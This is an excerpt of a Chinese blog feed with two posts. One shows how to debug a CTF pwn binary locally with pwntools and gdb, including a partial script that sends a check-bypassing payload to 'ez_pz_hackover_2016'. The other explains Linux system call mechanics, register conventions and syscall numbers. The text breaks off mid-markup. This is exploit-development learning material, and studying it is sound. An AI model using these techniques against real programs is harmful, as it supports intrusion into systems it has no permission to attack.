            "id": "https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/",
            "url": "https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/",
            "title": "gdb本地调试，基于pwndbg",
            "date_published": "2023-09-18T11:53:15.000Z",
            "content_html": "<h1 id=\"此处用于记录在编写脚本中对程序的调试\"><a class=\"anchor\" href=\"#此处用于记录在编写脚本中对程序的调试\">#</a> 此处用于记录在编写脚本中对程序的调试</h1>\n<p>因为有时要输入不可见字符，导致我们没办法进行直接在 gdb 内调试，所以需要相应的在脚本中调试</p>\n<h2 id=\"1调试方法\"><a class=\"anchor\" href=\"#1调试方法\">#</a> 1. 调试方法：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">\"b *断点地址\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#第一个 pause</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#第二个 pause</span></pre></td></tr></table></figure><p>此处的重点就是在发送 <code>payload</code>  前加入 <code>gdb.attach(p)</code>  和 <code>pause()</code> ，发送 <code>payload</code>  后加入 <code>pause()</code> ，然后在产生的新终端内设置断点（也可以在前面直接设置断点： <code>gdb.attach(p,&quot;b *0x8048600&quot;)</code> ）</p>\n<p>然后新终端内输入 <code>c</code>  继续执行，旧终端内按下回车便可以进行查询得到相应的栈情况</p>\n<p>不知道为什么要加入两个 <code>pause（）</code> 才行，前面一个防止程序直接发送结束，无法加入断点；后面一个不加入会导致无法读取栈的情况（程序貌似没有运行结束，个人猜测是设置断点的地方已经不需要栈了）</p>\n<h2 id=\"2调试例子\"><a class=\"anchor\" href=\"#2调试例子\">#</a> 2. 调试例子：</h2>\n<p>左边为新终端，右边为旧终端（pid 相同）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4tKjP.png\" alt=\"\" /><br />\n此时已经在代码里设置好了断点，在新终端内输入 <code>c</code> , 旧终端按回车即可</p>\n<p>可以看到已经发送了 <code>payload</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4tt9s.png\" alt=\"\" /></p>\n<p>可以看到已经发送的内容到了栈上<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4NGqK.png\" alt=\"\" /><br />\n (输入的值是 crashme，由于是小端序所以要倒着读，c 是 63，r 是 72，所以输入的位置是 0x22)</p>\n<p>上述例子具体的代码：</p>\n<pre><code class=\"language-pyhton\">from pwn import *\np=process('./ez_pz_hackover_2016')\ncontext.log_level='debug'\n \ngdb.attach(p)  ## 会在此处再打开一个终端\n# 'b *0x8048600'  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车\n，\np.recvuntil('crash: ')\nstack=int(p.recv(10),16)#接收s在栈上的地址\n\npayload='crashme\\x00'+'aaaaaa'#crashme\\x00绕过if判断      \n\npause()  #必须要在发送的payload前面，不然直接发送结束无法查询了\np.sendline(payload)\n \npause()  #\n</code></pre>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "url": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "title": "Linux之系统调用",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"一系统调用\"><a class=\"anchor\" href=\"#一系统调用\">#</a> 一。系统调用</h1>\n<p>系统调用也是一个函数，但是系统调用运行在内核态，用户自定义的函数在用户态。而我们想要调用在内核态的指令（如关闭 / 打开中断，I/O 操作等），就需要利用系统调用作为接口，让用户进入内核态。</p>\n<p>系统调用是 Linux 内核提供的一段代码（也可以理解为函数）用来实现特定的功能，**32 位程序（x86 CPU）利用 int 0x80 ** 来进行系统调用，<strong>64 位程序 (X64 CPU) 提供调用 syscall</strong> 来进行系统调用。Linux 内核提供用户空间程序与内核空间进行交互的接口（接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等），用户空间发起请求，内核空间负责进行执行，两者之间就需要接口作为桥梁，用户可以通过这种方式来进行系统调用，但是用户是受到限制的，不能直接执行内核代码，也不能随意进行修改系统，必须通过特定方式才能进行才能进入内核，也需要一定的权限才能使用接口。</p>\n<p>上述提到的用户空间与内核空间之间的桥梁就是系统调用 (syscall,system call), 其作为中间层用来连接用户态和内核态，这样做加强了一定的安全性，并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可。当用户空间向系统空间发起系统调用时，Linux 系统便会进行软中断，进入内核态执行相应的操作。</p>\n<p>不同的系统调用执行的命令有着不同的系统调用号（32 位程序与 64 位程序也不尽相同）</p>\n<h1 id=\"二32位程序系统调用\"><a class=\"anchor\" href=\"#二32位程序系统调用\">#</a> 二.<strong>32 位程序</strong>系统调用</h1>\n<h2 id=\"1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\"><a class=\"anchor\" href=\"#1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\">#</a> 1. 在 32 位系统（x86 CPU）中，Linux 通过了 int 0x80 中断来进入系统调用，</h2>\n<pre><code class=\"language-C\">void system_call()\n&#123;\n    ...\n    // 变量 eax 代表 eax 寄存器的值\n    syscall = sys_call_table[eax];\n    eax = syscall();\n    ...\n&#125;\n</code></pre>\n<p>sys_call_table 变量是一个数组（eax 寄存器的值作为其下标），数组的每一个元素代表着一个系统调用的入口（这让我想起了操作系统实验 x_x）, 其 C 代码如下</p>\n<pre><code class=\"language-C\">long sys_call_table[] = &#123;\n   sys_ni_syscall,\n   sys_exit,\n   sys_fork,\n   sys_read,\n   sys_write,\n   sys_open,\n   sys_close,\n   ...\n&#125;;\n</code></pre>\n<h2 id=\"用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\"><a class=\"anchor\" href=\"#用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\">#</a> 用户调用<strong>系统调用</strong>时，通过向 eax 寄存器写入对应命令的系统调用号，这个号就是 sys_call_table 数组的下标，system_call 过程获取 eax 寄存器的值，然后通过 eax 寄存器的值找到要调用的系统入口并调用，系统调用完成后会把<strong>返回值保存到 eax 寄存器中</strong></h2>\n<h2 id=\"用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\"><a class=\"anchor\" href=\"#用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\">#</a> 用户进行系统调用时，在 eax 寄存器写入对应的系统调用编号，而用户态和内核态使用的栈不同，系统调用是用户态调用然后进入系统调用后会转变成内核态，要经历用户态与内核态的转化，所以不能直接使用用户空间的栈来传递参数（32 位系统用户态内利用栈来传参，64 位仍然需要寄存器来传参）。Linux 使用寄存器来传递参数，其顺序如下：</h2>\n<ul>\n<li>第 1 个参数放置在 ebx  寄存器。</li>\n<li>第 2 个参数放置在 ecx  寄存器。</li>\n<li>第 3 个参数放置在 edx  寄存器。</li>\n<li>第 4 个参数放置在 esi   寄存器。</li>\n<li>第 5 个参数放置在 edi   寄存器。</li>\n<li>第 6 个参数放置在 ebp 寄存器。</li>\n</ul>\n<h2 id=\"linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\"><a class=\"anchor\" href=\"#linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\">#</a> Linux 进入中断处理时，就会将这些寄存器的值保存到内核栈中，这样系统调用就能通过内核栈来获取参数。</h2>\n<p>x86 架构系统调用漏洞利用参考: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjQ4NjgyLmh0bQ==\">https://bbs.kanxue.com/thread-248682.htm</span></p>\n<p>参考文章: <span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9jcklycg==\">Linux 下 syscall 系统调用原理及实现</span></p>\n<h1 id=\"三64位系统系统调用\"><a class=\"anchor\" href=\"#三64位系统系统调用\">#</a> 三.<strong>64 位系统</strong>系统调用</h1>\n<h2 id=\"164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\"><a class=\"anchor\" href=\"#164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\">#</a> 1.64 位（x64 架构）系统中，Linux 通过<strong> syscall 指令</strong>来进入系统调用，其他原理与 x86 架构相似，这里偷懒不再解释，不过 64 位系统与 32 位系统寄存器不同，这里传参的寄存器也不一样</h2>\n<h2 id=\"传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\"><a class=\"anchor\" href=\"#传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\">#</a> 传参方式：将系统调用号存入 rax 寄存器中，然后从左到右依次将参数传入<strong> rdi、rsi、rdx 寄存器</strong>中：</h2>\n<ul>\n<li>第 1 个参数放置在 rdi  寄存器。</li>\n<li>第 2 个参数放置在 rsi  寄存器。</li>\n<li>第 3 个参数放置在 rdx  寄存器。</li>\n<li>第 4 个参数放置在 rcx  寄存器。</li>\n<li>第 5 个参数放置在 r8  寄存器。</li>\n<li>第 6 个参数放置在 r9  寄存器。</li>\n</ul>\n<h2 id=\"系统调用完成后把返回值保存到rax寄存器中\"><a class=\"anchor\" href=\"#系统调用完成后把返回值保存到rax寄存器中\">#</a> 系统调用完成后，把<strong>返回值保存到 rax 寄存器中</strong></h2>\n<h1 id=\"四32位系统与64位系统-对比系统调用不同\"><a class=\"anchor\" href=\"#四32位系统与64位系统-对比系统调用不同\">#</a> 四.32 位系统与 64 位系统 <strong>对比系统调用不同</strong></h1>\n<h2 id=\"1系统调用号不同\"><a class=\"anchor\" href=\"#1系统调用号不同\">#</a> 1. 系统调用号不同</h2>\n<h3 id=\"32位\"><a class=\"anchor\" href=\"#32位\">#</a> 32 位</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_32_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_32_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_restart_syscall 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_exit 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_fork 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_read 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_write 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_open 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_close 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_waitpid 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_creat 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_link 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_unlink 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_execve 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_chdir 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_time 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_mknod 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_chmod 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_lchown 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_break 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_oldstat 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_mount 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_umount 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_setuid 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_getuid 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_stime 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_ptrace 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_oldfstat 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_pause 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_utime 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_stty 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_gtty 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_access 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_nice 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_ftime 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_sync 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_kill 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_rename 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_mkdir 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_rmdir 40</span></pre></td></tr></table></figure><h3 id=\"64位系统\"><a class=\"anchor\" href=\"#64位系统\">#</a> 64 位系统</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_64_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_64_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_read 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_write 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_open 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_close 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_stat 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_fstat 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_lstat 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_poll 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_mmap 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_mprotect 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_munmap 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_brk 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigaction 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigprocmask 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigreturn 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_ioctl 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_pread64 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_pwrite64 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_readv 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_writev 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_access 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_pipe 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_select 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_sched_yield 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_mremap 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_msync 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_mincore 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_madvise 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_shmget 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_shmat 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_shmctl 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_dup 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_dup2 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_pause 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_nanosleep 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_getitimer 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_setitimer 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_sendfile 40</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#define __NR_socket 41</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#define __NR_connect 42</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#define __NR_accept 43</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#define __NR_sendto 44</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\">#define __NR_recvfrom 45</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">#define __NR_sendmsg 46</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#define __NR_recvmsg 47</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">#define __NR_shutdown 48</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#define __NR_bind 49</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#define __NR_listen 50</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#define __NR_getsockname 51</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">#define __NR_getpeername 52</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\">#define __NR_socketpair 53</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#define __NR_setsockopt 54</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#define __NR_getsockopt 55</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">#define __NR_clone 56</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">#define __NR_fork 57</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">#define __NR_vfork 58</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#define __NR_execve 59</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">#define __NR_exit 60</span></pre></td></tr></table></figure><p>完整系统调用号:<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9kcnN5eQ==\">http://t.csdn.cn/drsyy</span></p>\n<h2 id=\"2寄存器传参不同上面已经说明过了\"><a class=\"anchor\" href=\"#2寄存器传参不同上面已经说明过了\">#</a> 2. 寄存器传参不同 (上面已经说明过了)</h2>\n<h2 id=\"3进行系统调用方式不同\"><a class=\"anchor\" href=\"#3进行系统调用方式不同\">#</a> 3. 进行系统调用方式不同</h2>\n<p>32 位系统通过 ** int 0x80 ** 中断进入系统调用</p>\n<p>64 位系统通过 ** syscall ** 命令进入系统调用</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9KejZIbQ==\">http://t.csdn.cn/Jz6Hm</span></p>\n<h1 id=\"五-open-write-read-close的系统调用\"><a class=\"anchor\" href=\"#五-open-write-read-close的系统调用\">#</a> 五、open、write、read、close 的系统调用</h1>\n<h2 id=\"1文件描述符\"><a class=\"anchor\" href=\"#1文件描述符\">#</a> 1. 文件描述符</h2>\n<p>每一个进程都有一个与之相关的文件描述符，它们是一些小值整数，我们可以通过这些文件描述符来访问打开的文件</p>\n<p>一般地，一个程序开始运行时，会自动打开 3 个文件描述符：</p>\n<ul>\n<li>0——–标准输入 ———-stdin</li>\n<li>1——–标准输出 ———-stdout</li>\n<li>2——–标准错误 ———-stderr</li>\n</ul>\n<h2 id=\"2write系统调用\"><a class=\"anchor\" href=\"#2write系统调用\">#</a> 2.write 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>write 系统调用，是把缓存区 buf 中的前 nbytes 字节写入到与文件描述符 <code>flides有关</code> 的文件中，write 系统调用返回的是实际写入到文件中的 <code>字节数</code> 。</p>\n<p>例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> #标准输出流（<span class=\"token number\">1</span>），将aaa输出到屏幕上</pre></td></tr></table></figure><h2 id=\"3read系统调用\"><a class=\"anchor\" href=\"#3read系统调用\">#</a> 3.read 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>read 系统调用，是从与文件描述符 flides 相关联的文件中读取前 nbytes 字节的内容，并且写入到数据区 buf 中。read 系统调用返回的是实际读入的 <code>字节数</code></p>\n<h2 id=\"4open系统调用\"><a class=\"anchor\" href=\"#4open系统调用\">#</a> 4.open 系统调用</h2>\n<p>两种系统调用方式</p>\n<h3 id=\"第一种\"><a class=\"anchor\" href=\"#第一种\">#</a> 第一种</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>path<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> oflags<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>将准备打开的文件或是设备的名字作为参数 path 传给函数，oflags 用来指定文件访问模式。open 系统调用成功返回一个新的文件描述符，失败返回 - 1。</p>\n<p>其中，oflags 是由必需文件访问模式和可选模式一起构成的 (通过按位或 “|”)：</p>\n<p>必需部分：</p>\n<ul>\n<li>O_RDONLY------ 以只读方式打开</li>\n<li>O_WRONLY------ 以只写方式打开</li>\n<li>O_RDWR -------- 以读写方式打开</li>\n</ul>\n<p>例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> f<span class=\"token operator\">=</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file.c\"</span><span class=\"token punctuation\">,</span>O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 以只读方式打开文件</span></pre></td></tr></table></figure><h3 id=\"第二种\"><a class=\"anchor\" href=\"#第二种\">#</a> 第二种</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td 